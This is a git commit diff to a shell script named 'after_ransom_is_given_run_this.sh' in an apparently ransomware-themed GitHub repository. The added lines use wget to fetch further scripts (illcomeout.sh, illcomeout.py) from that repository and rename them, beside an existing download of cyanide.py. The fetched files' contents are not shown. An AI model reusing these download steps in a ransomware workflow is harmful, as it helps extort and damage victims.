4f6c24e91630156f1e0c79533be0d61b2eb7fce0
samsepi0lw <147035842+samsepi0lw@users.noreply.github.com>
2023-10-13 06:02:09 +0000

    Update after_ransom_is_given_run_this.sh

--- after_ransom_is_given_run_this.sh
+++ after_ransom_is_given_run_this.sh
@@ -1,4 +1,8 @@
 wget https://github.com/samsepi0lw/ransom/blob/main/cyanide.py?raw=true
+wget https://github.com/samsepi0lw/ransom/blob/main/illcomeout.sh?raw=true
+wget https://github.com/samsepi0lw/ransom/blob/main/illcomeout.py?raw=true
+mv illcomeout.py\?raw=true illcomeout.py
+mv illcomeout.sh\?raw=true illcomeout.sh
 mv cyanide.py\?raw=true cyanide.py
 clear
 #!/bin/bash
